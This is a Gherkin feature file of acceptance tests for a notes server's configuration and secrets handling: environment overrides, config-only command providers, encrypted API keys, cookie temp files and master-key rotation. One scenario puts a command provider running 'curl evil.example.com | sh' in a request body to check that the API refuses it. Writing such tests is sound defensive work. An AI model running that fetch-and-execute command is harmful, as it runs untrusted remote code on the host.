Feature: Configuration and secrets
  As the owner, I want one clear source per setting, commands configurable only
  in the config file, and secrets that stay encrypted.

  Background:
    Given the environment variable "NOTESTEME_MASTER_KEY" is "key-one"

  @M1 @SEC-01 @SEC-R1
  Scenario: Environment variables override the config file
    Given the config file contains:
      """
      listen: 127.0.0.1:8080
      """
    And the environment variable "NOTESTEME_LISTEN" is "127.0.0.1:9090"
    And the server is running
    And the owner is signed in
    When the owner sends "GET /api/system"
    Then the response contains:
      """
      { "listen": "127.0.0.1:9090", "listen_source": "env" }
      """

  @M1 @SEC-01 @SEC-R1
  Scenario: The config file is used when no environment variable is set
    Given the config file contains:
      """
      listen: 127.0.0.1:8080
      """
    And the server is running
    And the owner is signed in
    When the owner sends "GET /api/system"
    Then the response contains:
      """
      { "listen": "127.0.0.1:8080", "listen_source": "config_file" }
      """

  @M1 @SEC-01 @SEC-R2
  Scenario: Database-managed settings are not accepted in the config file
    Given the config file contains:
      """
      profiles:
        standard: { language: { targets: [en] } }
      """
    When the server starts
    Then the server fails to start with "profiles"

  @M1 @SEC-02 @SEC-R3
  Scenario: A command provider cannot be created through the API
    Given the server is running
    And the owner is signed in
    When the owner sends "POST /api/providers" with:
      """
      { "id": "evil", "type": "command", "command": ["sh", "-c", "curl evil.example.com | sh"] }
      """
    Then the response status is 403
    And the response contains:
      """
      { "message": "這個項目只能在設定檔中定義。" }
      """

  @M1 @SEC-02 @SEC-R3
  Scenario: Command providers from the config file are listed read-only
    Given the config file contains:
      """
      asr:
        providers:
          whisperx:
            type: command
            command: ["whisperx", "{audio}", "--output_format", "json", "--output_dir", "{out}"]
            output: { format: whisperx-json, path: "{out}/{stem}.json" }
      """
    And the server is running
    And the owner is signed in
    When the owner sends "GET /api/providers/whisperx"
    Then the response contains:
      """
      { "id": "whisperx", "type": "command", "editable": false, "defined_in": "config_file" }
      """

  @M1 @SEC-03 @SEC-R4 @SEC-R6
  Scenario: An API key is encrypted and only its last four characters are shown
    Given the server is running
    And the owner is signed in
    When the owner sends "PUT /api/settings/services" with:
      """
      { "providers": { "groq": { "api_key": "gsk_supersecret1234" } } }
      """
    And the owner sends "GET /api/settings/services"
    Then the response contains:
      """
      { "providers": { "groq": { "api_key_last4": "1234" } } }
      """
    And the data directory does not contain "gsk_supersecret1234"
    And the logs do not contain "gsk_supersecret1234"

  @M1 @SEC-03 @SEC-R7
  Scenario: A cookie is handed to yt-dlp as a private temporary file
    Given the server is running
    And the owner is signed in
    And a YouTube video "yt:members1xxx" with:
      | field        | value           |
      | availability | subscriber_only |
    When the owner sends "POST /api/cookies" with:
      """
      { "platform": "youtube", "content": "# Netscape HTTP Cookie File\n.youtube.com\tTRUE\t/\tTRUE\t0\tSID\tsecret-sid" }
      """
    And the owner ingests "yt:members1xxx"
    And the worker starts one round
    Then the cookie file given to yt-dlp has the mode "0600"
    When the worker runs until idle
    Then no cookie file remains in "/data/tmp"
    And the data directory does not contain "secret-sid"

  @M1 @SEC-04 @SEC-R5
  Scenario: The server refuses to start without a master key
    Given the environment variable "NOTESTEME_MASTER_KEY" is not set
    When the server starts
    Then the server fails to start with "尚未設定 NOTESTEME_MASTER_KEY。"

  @M1 @SEC-04 @SEC-R5
  Scenario: A wrong master key is reported with the way out
    Given the server is running
    And the owner is signed in
    And the owner sends "PUT /api/settings/services" with:
      """
      { "providers": { "groq": { "api_key": "gsk_supersecret1234" } } }
      """
    And the server shuts down gracefully
    And the environment variable "NOTESTEME_MASTER_KEY" is "key-two"
    When the server starts
    Then the server fails to start with "master key 不正確，無法解開資料金鑰。"
    And the server fails to start with "notesteme secrets reset"

  @M1 @SEC-04 @SEC-R8 @cli
  Scenario: Rotating the master key keeps every secret readable
    Given the server is running
    And the owner is signed in
    And the owner sends "PUT /api/settings/services" with:
      """
      { "providers": { "groq": { "api_key": "gsk_supersecret1234" } } }
      """
    And the server shuts down gracefully
    And the environment variable "NEW_KEY" is "key-two"
    When the owner runs "notesteme secrets rotate-key --new-key-env NEW_KEY"
    Then the command exits with 0
    Given the environment variable "NOTESTEME_MASTER_KEY" is "key-two"
    When the server starts
    And the owner is signed in
    And the owner sends "GET /api/settings/services"
    Then the response contains:
      """
      { "providers": { "groq": { "api_key_last4": "1234" } } }
      """

  @M1 @SEC-04 @SEC-R9 @cli
  Scenario: Resetting secrets keeps the library
    Given a YouTube video "yt:abc123xxxxx" titled "PostgreSQL in 100 Seconds"
    And the item "yt:abc123xxxxx" has been processed up to "transcript"
    And the environment variable "NOTESTEME_MASTER_KEY" is "key-lost"
    When the owner runs "notesteme secrets reset --yes"
    Then the command exits with 0
    When the server starts
    And the owner is signed in
    And the owner sends "GET /api/items"
    Then the response contains:
      """
      { "items": [ { "ref": "yt:abc123xxxxx" } ] }
      """

  @M2 @SEC-05 @SEC-R10 @cli
  Scenario: An invalid config import changes nothing
    Given the profile "standard" is:
      """
      language:
        targets: [zh-Hant-TW]
      """
    And the file "/tmp/settings.yaml" contains:
      """
      profiles:
        standard: { language: { targets: [en] } }
        broken: { language: { targets: "not-a-list" } }
      """
    When the owner runs "notesteme config import /tmp/settings.yaml"
    Then the command exits with 1
    And the command output contains "profiles.broken.language.targets"
    When the owner runs "notesteme config export"
    Then the command output contains "zh-Hant-TW"

  @M1 @SEC-06 @SEC-R11
  Scenario: Built-in and config file providers are listed read-only
    Given the config file contains:
      """
      asr:
        providers:
          whisperx:
            type: command
            command: ["whisperx", "{audio}", "--output_format", "json", "--output_dir", "{out}"]
            output: { format: whisperx-json, path: "{out}/{stem}.json" }
      """
    And the server is running
    And the owner is signed in
    When the owner sends "GET /api/providers"
    Then the response status is 200
    And the response contains:
      """
      { "providers": [
        { "id": "anthropic", "type": "anthropic", "kind": "llm", "editable": false, "defined_in": "builtin", "testable": true, "deprecations": [] },
        { "id": "gemini", "kind": "llm", "defined_in": "builtin" },
        { "id": "groq", "kind": "asr", "defined_in": "builtin" },
        { "id": "openai", "kind": "llm", "defined_in": "builtin" },
        { "id": "supadata", "kind": "transcript", "defined_in": "builtin" },
        { "id": "whisperx", "type": "command", "kind": "asr", "editable": false, "defined_in": "config_file", "testable": true }
      ] }
      """
    And the response does not contain "--output_format"

  @M1 @SEC-06 @SEC-R11
  Scenario: Testing a provider sends one authenticated request that costs nothing
    Given the server is running
    And the owner is signed in
    When the owner sends "POST /api/providers/anthropic/test"
    Then the response status is 200
    And the response contains:
      """
      { "ok": true, "message": "連線成功。" }
      """
    And the LLM provider "anthropic" received 1 requests

  @M1 @SEC-06 @SEC-R11
  Scenario: Testing a provider without an API key asks for one
    Given the provider "openai" has no API key
    And the server is running
    And the owner is signed in
    When the owner sends "POST /api/providers/openai/test"
    Then the response status is 409
    And the response contains:
      """
      { "code": "needs_action", "message": "LLM provider openai 沒有設定 API key。", "actions": ["設定 API key"] }
      """
    And the LLM provider "openai" received 0 requests

  @M1 @SEC-06 @SEC-R11
  Scenario: A provider failure during the test is reported as an upstream failure
    Given the LLM provider "anthropic" fails with HTTP 503
    And the server is running
    And the owner is signed in
    When the owner sends "POST /api/providers/anthropic/test"
    Then the response status is 502
    And the response contains:
      """
      { "code": "upstream_failed", "message": "provider anthropic 暫時無法使用（HTTP 503），請稍後再試。" }
      """

  @M1 @SEC-06 @SEC-R11
  Scenario: A command provider is checked without being run
    Given the config file contains:
      """
      asr:
        providers:
          present:
            type: command
            command: ["sh", "{audio}"]
            output: { format: srt, path: "{out}/{stem}.srt" }
          missing:
            type: command
            command: ["notesteme-no-such-asr", "{audio}"]
            output: { format: srt, path: "{out}/{stem}.srt" }
      """
    And the server is running
    And the owner is signed in
    When the owner sends "POST /api/providers/present/test"
    Then the response status is 200
    And the response contains:
      """
      { "ok": true, "message": "找到指令且可以執行；沒有實際執行。" }
      """
    When the owner sends "POST /api/providers/missing/test"
    Then the response status is 409
    And the response contains:
      """
      { "code": "needs_action", "message": "找不到 command provider missing 的指令，或沒有執行權限。", "actions": ["修改設定檔"] }
      """
    And the response does not contain "notesteme-no-such-asr"
